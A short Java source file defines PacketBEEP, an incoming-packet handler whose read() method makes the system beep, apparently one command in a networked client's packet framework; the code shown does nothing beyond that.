package com.redpois0n.packets.incoming;

import java.awt.Toolkit;

public class PacketBEEP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Toolkit.getDefaultToolkit().beep();
	}

}
